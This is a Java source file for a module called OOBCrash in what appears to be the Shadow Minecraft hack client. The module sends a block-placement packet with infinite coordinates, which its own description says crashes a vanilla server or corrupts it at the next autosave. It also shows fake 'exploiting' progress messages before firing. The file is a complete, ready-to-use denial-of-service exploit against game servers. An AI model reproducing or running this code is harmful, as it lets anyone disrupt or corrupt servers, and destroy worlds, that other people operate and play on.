/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.util.Utils;

import java.util.Objects;

public class OOBCrash extends Module {
    final Step[] bogusSteps = new Step[] { new Step("Exploiting packet handler", 2000), new Step("Attempting to override isValid(Lnet/minecraft/util/math/Vec3d;)Z method", 1000), new Step("Packet handler dump: 0x05 0x13 0x11 0x92 (INJECTING HERE) 0x00 0x00 0x00 0x00", 2000), new Step("Requesting out of bounds", 1000), new Step("Sending packet", 100), new Step("Overwriting isValid:Z", 100), new Step("Cancelling packet checks", 100), new Step("Finalizing", 1000), new Step("", 1000) };
    long startTime = System.currentTimeMillis();
    Step current;

    public OOBCrash() {
        super("OOBCrash", "Crashes / even bricks a vanilla server by requesting block placement", ModuleType.CRASH);
    }

    @Override
    public void tick() {

    }

    void doIt() {
        BlockHitResult bhr = new BlockHitResult(Objects.requireNonNull(ShadowMain.client.player).getPos(), Direction.DOWN, new BlockPos(new Vec3d(Double.POSITIVE_INFINITY, 100, Double.NEGATIVE_INFINITY)), false);
        PlayerInteractBlockC2SPacket p = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr);
        Objects.requireNonNull(ShadowMain.client.getNetworkHandler()).sendPacket(p);
        Utils.Logging.message("Wait a bit for this to complete, the server will run fine until it autosaves the world. After that, it will just brick itself.");
        setEnabled(false);
    }

    @Override
    public void onFastTick() {
        long timeDelay = System.currentTimeMillis() - startTime;
        timeDelay = Math.max(0, timeDelay);
        long passed = 0;
        for (Step bogusStep : bogusSteps) {
            if (passed < timeDelay && passed + bogusStep.takes > timeDelay) {
                current = bogusStep;
                break;
            }
            passed += bogusStep.takes;
        }
        if (current.t.isEmpty()) {
            doIt();
        }
    }

    @Override
    public void enable() {
        startTime = System.currentTimeMillis();
    }

    @Override
    public void disable() {

    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {
    }

    record Step(String t, long takes) {
    }
}
